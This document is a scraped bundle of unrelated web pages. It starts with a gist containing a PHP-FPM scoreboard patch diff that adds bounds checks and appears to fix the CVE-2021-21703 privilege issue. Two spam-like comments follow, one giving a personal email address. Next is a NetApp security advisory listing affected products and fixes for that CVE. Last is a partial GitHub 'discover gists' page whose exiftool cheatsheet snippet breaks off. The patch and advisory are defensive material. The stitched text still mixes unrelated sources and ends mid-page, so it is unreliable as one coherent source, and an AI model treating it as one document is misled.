|  | @@ -324,7 +324,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  | return 0; |
|  | } |
|  |  |
|  | - if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) { |
|  | + if (0 > fpm\_scoreboard\_proc\_alloc(c)) { |
|  | fpm\_stdio\_discard\_pipes(c); |
|  | fpm\_child\_free(c); |
|  | return 0; |
|  | @@ -336,7 +336,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  |
|  | static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | { |
|  | - fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i); |
|  | + fpm\_scoreboard\_proc\_free(child); |
|  | fpm\_stdio\_discard\_pipes(child); |
|  | fpm\_child\_free(child); |
|  | } |
|  | @@ -349,10 +349,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | if (wp == child->wp) { |
|  | continue; |
|  | } |
|  | - fpm\_scoreboard\_free(wp->scoreboard); |
|  | + fpm\_scoreboard\_free(wp); |
|  | } |
|  |  |
|  | - fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid()); |
|  | + fpm\_scoreboard\_child\_use(child, getpid()); |
|  | fpm\_stdio\_child\_use\_pipes(child); |
|  | fpm\_child\_free(child); |
|  | } |
|  | diff --git a/sapi/fpm/fpm/fpm\_request.c b/sapi/fpm/fpm/fpm\_request.c |
|  | index c80aa14462..0a6f6a7cfb 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_request.c |
|  | +++ b/sapi/fpm/fpm/fpm\_request.c |
|  | @@ -285,7 +285,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  |
|  | /\* no need in atomicity here \*/ |
|  | - proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | if (!proc) { |
|  | return 0; |
|  | } |
|  | @@ -300,7 +300,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\* |
|  |  |
|  | if (!tv) return -1; |
|  |  |
|  | - proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | if (!proc) { |
|  | return -1; |
|  | } |
|  | diff --git a/sapi/fpm/fpm/fpm\_scoreboard.c b/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | index 328f999f0c..7e9da4d684 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | +++ b/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | @@ -6,6 +6,7 @@ |
|  | #include <time.h> |
|  |  |
|  | #include "fpm\_config.h" |
|  | +#include "fpm\_children.h" |
|  | #include "fpm\_scoreboard.h" |
|  | #include "fpm\_shm.h" |
|  | #include "fpm\_sockets.h" |
|  | @@ -23,7 +24,6 @@ static float fpm\_scoreboard\_tick; |
|  | int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  | { |
|  | struct fpm\_worker\_pool\_s \*wp; |
|  | - unsigned int i; |
|  |  |
|  | #ifdef HAVE\_TIMES |
|  | #if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK)) |
|  | @@ -40,7 +40,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  |
|  |  |
|  | for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) { |
|  | - size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  | + size\_t scoreboard\_procs\_size; |
|  | void \*shm\_mem; |
|  |  |
|  | if (wp->config->pm\_max\_children < 1) { |
|  | @@ -53,22 +53,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  | return -1; |
|  | } |
|  |  |
|  | - scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  | - scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  | - shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size); |
|  | + scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  | + shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  |
|  | if (!shm\_mem) { |
|  | return -1; |
|  | } |
|  | - wp->scoreboard = shm\_mem; |
|  | + wp->scoreboard = shm\_mem; |
|  | + wp->scoreboard->pm = wp->config->pm; |
|  | wp->scoreboard->nprocs = wp->config->pm\_max\_children; |
|  | - shm\_mem += scoreboard\_size; |
|  | - |
|  | - for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) { |
|  | - wp->scoreboard->procs[i] = shm\_mem; |
|  | - } |
|  | - |
|  | - wp->scoreboard->pm = wp->config->pm; |
|  | wp->scoreboard->start\_epoch = time(NULL); |
|  | strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool)); |
|  | } |
|  | @@ -162,28 +155,48 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/ |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | -struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  | +static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex( |
|  | + struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/ |
|  | { |
|  | if (!scoreboard) { |
|  | - scoreboard = fpm\_scoreboard; |
|  | + return NULL; |
|  | } |
|  |  |
|  | - if (!scoreboard) { |
|  | + if (child\_index < 0 || (unsigned int)child\_index >= nprocs) { |
|  | return NULL; |
|  | } |
|  |  |
|  | + return &scoreboard->procs[child\_index]; |
|  | +} |
|  | +/\* }}} \*/ |
|  | + |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get( |
|  | + struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  | +{ |
|  | + if (!scoreboard) { |
|  | + scoreboard = fpm\_scoreboard; |
|  | + } |
|  | + |
|  | if (child\_index < 0) { |
|  | child\_index = fpm\_scoreboard\_i; |
|  | } |
|  |  |
|  | - if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  | - return NULL; |
|  | - } |
|  | + return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs); |
|  | +} |
|  | +/\* }}} \*/ |
|  |  |
|  | - return scoreboard->procs[child\_index]; |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/ |
|  | +{ |
|  | + struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  | + unsigned int nprocs = wp->config->pm\_max\_children; |
|  | + struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  | + int child\_index = child->scoreboard\_i; |
|  | + |
|  | + return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs); |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | + |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/ |
|  | { |
|  | struct fpm\_scoreboard\_s \*s; |
|  | @@ -234,28 +247,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/ |
|  | proc->lock = 0; |
|  | } |
|  |  |
|  | -void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/ |
|  | +void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/ |
|  | { |
|  | - size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  | + size\_t scoreboard\_procs\_size; |
|  | + struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  |
|  | if (!scoreboard) { |
|  | zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL"); |
|  | return; |
|  | } |
|  |  |
|  | - scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  | - scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs; |
|  | + scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  |
|  | - fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size); |
|  | + fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | -void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/ |
|  | +void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/ |
|  | { |
|  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  | - fpm\_scoreboard = scoreboard; |
|  | - fpm\_scoreboard\_i = child\_index; |
|  | - proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index); |
|  | + fpm\_scoreboard = child->wp->scoreboard; |
|  | + fpm\_scoreboard\_i = child->scoreboard\_i; |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | if (!proc) { |
|  | return; |
|  | } |
|  | @@ -264,18 +277,22 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | -void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/ |
|  | +void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | { |
|  | + struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  | + struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  | + int child\_index = child->scoreboard\_i; |
|  | + |
|  | if (!scoreboard) { |
|  | return; |
|  | } |
|  |  |
|  | - if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  | + if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) { |
|  | return; |
|  | } |
|  |  |
|  | - if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) { |
|  | - memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  | + if (scoreboard->procs[child\_index].used > 0) { |
|  | + memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  | } |
|  |  |
|  | /\* set this slot as free to avoid search on next alloc \*/ |
|  | @@ -283,41 +300,44 @@ void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | -int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/ |
|  | +int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | { |
|  | int i = -1; |
|  | + struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  | + struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  | + int nprocs = wp->config->pm\_max\_children; |
|  |  |
|  | - if (!scoreboard || !child\_index) { |
|  | + if (!scoreboard) { |
|  | return -1; |
|  | } |
|  |  |
|  | /\* first try the slot which is supposed to be free \*/ |
|  | - if (scoreboard->free\_proc >= 0 && (unsigned int)scoreboard->free\_proc < scoreboard->nprocs) { |
|  | - if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) { |
|  | + if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) { |
|  | + if (!scoreboard->procs[scoreboard->free\_proc].used) { |
|  | i = scoreboard->free\_proc; |
|  | } |
|  | } |
|  |  |
|  | if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/ |
|  | zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool); |
|  | - for (i = 0; i < (int)scoreboard->nprocs; i++) { |
|  | - if (scoreboard->procs[i] && !scoreboard->procs[i]->used) { /\* found \*/ |
|  | + for (i = 0; i < nprocs; i++) { |
|  | + if (!scoreboard->procs[i].used) { /\* found \*/ |
|  | break; |
|  | } |
|  | } |
|  | } |
|  |  |
|  | /\* no free slot \*/ |
|  | - if (i < 0 || i >= (int)scoreboard->nprocs) { |
|  | + if (i < 0 || i >= nprocs) { |
|  | zlog(ZLOG\_ERROR, "[pool %s] no free scoreboard slot", scoreboard->pool); |
|  | return -1; |
|  | } |
|  |  |
|  | - scoreboard->procs[i]->used = 1; |
|  | - \*child\_index = i; |
|  | + scoreboard->procs[i].used = 1; |
|  | + child->scoreboard\_i = i; |
|  |  |
|  | /\* supposed next slot is free \*/ |
|  | - if (i + 1 >= (int)scoreboard->nprocs) { |
|  | + if (i + 1 >= nprocs) { |
|  | scoreboard->free\_proc = 0; |
|  | } else { |
|  | scoreboard->free\_proc = i + 1; |
|  | diff --git a/sapi/fpm/fpm/fpm\_scoreboard.h b/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | index 1fecde1d0f..9d5981e1c7 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | +++ b/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | @@ -63,7 +63,7 @@ struct fpm\_scoreboard\_s { |
|  | unsigned int nprocs; |
|  | int free\_proc; |
|  | unsigned long int slow\_rq; |
|  | - struct fpm\_scoreboard\_proc\_s \*procs[]; |
|  | + struct fpm\_scoreboard\_proc\_s procs[]; |
|  | }; |
|  |  |
|  | int fpm\_scoreboard\_init\_main(); |
|  | @@ -72,18 +72,19 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp); |
|  | void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard); |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get(); |
|  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child); |
|  |  |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang); |
|  | void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard); |
|  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang); |
|  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc); |
|  |  |
|  | -void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard); |
|  | +void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp); |
|  |  |
|  | -void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid); |
|  | +void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid); |
|  |  |
|  | -void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  | -int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index); |
|  | +void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child); |
|  | +int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child); |
|  |  |
|  | #ifdef HAVE\_TIMES |
|  | float fpm\_scoreboard\_get\_tick(); |
|  | diff --git a/sapi/fpm/fpm/fpm\_status.c b/sapi/fpm/fpm/fpm\_status.c |
|  | index 36d2240635..de8db9d61a 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_status.c |
|  | +++ b/sapi/fpm/fpm/fpm\_status.c |
|  | @@ -498,10 +498,10 @@ int fpm\_status\_handle\_request(void) /\* {{{ \*/ |
|  |  |
|  | first = 1; |
|  | for (i=0; i<scoreboard\_p->nprocs; i++) { |
|  | - if (!scoreboard\_p->procs[i] || !scoreboard\_p->procs[i]->used) { |
|  | + if (!scoreboard\_p->procs[i].used) { |
|  | continue; |
|  | } |
|  | - proc = \*scoreboard\_p->procs[i]; |
|  | + proc = scoreboard\_p->procs[i]; |
|  |  |
|  | if (first) { |
|  | first = 0; |
|  | diff --git a/sapi/fpm/fpm/fpm\_worker\_pool.c b/sapi/fpm/fpm/fpm\_worker\_pool.c |
|  | index d04528f4e0..65a9b226b1 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_worker\_pool.c |
|  | +++ b/sapi/fpm/fpm/fpm\_worker\_pool.c |
|  | @@ -54,7 +54,7 @@ static void fpm\_worker\_pool\_cleanup(int which, void \*arg) /\* {{{ \*/ |
|  | fpm\_worker\_pool\_config\_free(wp->config); |
|  | fpm\_children\_free(wp->children); |
|  | if ((which & FPM\_CLEANUP\_CHILD) == 0 && fpm\_globals.parent\_pid == getpid()) { |
|  | - fpm\_scoreboard\_free(wp->scoreboard); |
|  | + fpm\_scoreboard\_free(wp); |
|  | } |
|  | fpm\_worker\_pool\_free(wp); |
|  | } |
|  | -- |
|  | 2.25.1 |
|  |  |

[![@ManuchehrBoudesh](https://avatars.githubusercontent.com/u/95558983?s=80&v=4)](/ManuchehrBoudesh)

Copy link

### **[ManuchehrBoudesh](/ManuchehrBoudesh)** commented [Mar 7, 2022](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7?permalink_comment_id=4087996#gistcomment-4087996)

manuchehrgsm@gmail.com

Sorry, something went wrong.

[![@ManuchehrBoudesh](https://avatars.githubusercontent.com/u/95558983?s=80&v=4)](/ManuchehrBoudesh)

Copy link

### **[ManuchehrBoudesh](/ManuchehrBoudesh)** commented [Mar 7, 2022](/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7?permalink_comment_id=4087997#gistcomment-4087997)

criptocurrveicy Manuchehrgsm

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fsmalyshev%2Fee7779f098cbfe2fab3799ada2a2f0f7)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.netapp.com_4e082c51_20250115_115355.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2021-21703 PHP Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20211118-0003)

## CVE-2021-21703 PHP Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20211118-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20211118-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20211118-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20211118-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20211118-0003
**Version:**
7.0

**Last updated:**
05/09/2024

**Status:**
Final.

**CVEs:** CVE-2021-21703

Overview
#### Summary

Multiple NetApp products incorporate PHP. PHP versions 7.3.x prior to 7.3.32, 7.4.x prior to 7.4.25, and 8.0.x prior to 8.0.12 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2021-21703](https://nvd.nist.gov/vuln/detail/CVE-2021-21703) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://www.php.net/ChangeLog-7.php#7.3.32>

Affected Products
#### Affected Products

* ONTAP 9 (formerly Clustered Data ONTAP)

#### Products Not Affected

* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - Cloud Insights Telegraf Agent
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM6 SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112
* StorageGRID Baseboard Management Controller (BMC)
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **ONTAP 9 (formerly Clustered Data ONTAP)** | <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.6P18> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.7P19> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.8P11> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.9.1P6> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.10.1> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20211118-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20211118 | Initial Public Release |
| 2.0 | 20220113 | Clustered Data ONTAP added to Software Versions and Fixes |
| 3.0 | 20220121 | Clustered Data ONTAP 9.10.1 added to Software Versions and Fixes |
| 4.0 | 20220322 | Clustered Data ONTAP 9.8P11 added to Software Versions and Fixes |
| 5.0 | 20220419 | Clustered Data ONTAP 9.6P18 added to Software Versions and Fixes |
| 6.0 | 20220607 | Clustered Data ONTAP 9.7P19 added to Software Versions and Fixes |
| 7.0 | 20240509 | Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from gist.github.com_597d2672_20250115_115350.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fstarred)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fstarred&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fstarred) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fstarred&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

# Discover gists

* [All gists](/discover)
* [Forked](/forked)
* [Starred](/starred)

* [1 file](/rjames86/33b9af12548adf091a26)
* [69 forks](/rjames86/33b9af12548adf091a26/forks)
* [18 comments](/rjames86/33b9af12548adf091a26#comments)
* [355 stars](/rjames86/33b9af12548adf091a26/stargazers)

[![@rjames86](https://avatars.githubusercontent.com/u/2505979?s=60&v=4)](/rjames86)

[rjames86](/rjames86)
/ [**My Exiftool Cheatsheet.md**](/rjames86/33b9af12548adf091a26)

Last active
January 15, 2025 11:53

*Last updated: 2017-03-18*

## Searching for Files

### Find images in a directory that don't have a DateTimeOriginal

```
exiftool -filename -filemodifydate -createdate -r -if '(not $datetimeoriginal) and $filetype eq "JPEG"' .

```

###Output photos that don't have datetimeoriginal to a CSV###
*Note this can take a long time if you have a lot of jpgs*

* [1 file](/Tanu-N-Prabhu/6bae277a07d9ed8571431dc4d466bba9)
* [1 fork](/Tanu-N-Prabhu/6bae277a07d9ed8571431dc4d466bba9/forks)
* [1 comment](/Tanu-N-Prabhu/6bae277a07d9ed8571431dc4d466bba9#comments)
* [2 stars](/Tanu-N-Prabhu/6bae277a07d9ed8571431dc4d466bba9/stargazers)

[![@Tanu-N-Prabhu](https://avatars.githubusercontent.com/u/49044332?s=60&v=4)](/Tanu-N-Prabhu)

[Tanu-N-Prabhu](/Tanu-N-Prabhu)
/ [**contributors**](/Tanu-N-Prabhu/6bae277a07d9ed8571431dc4d466bba9)

Last active
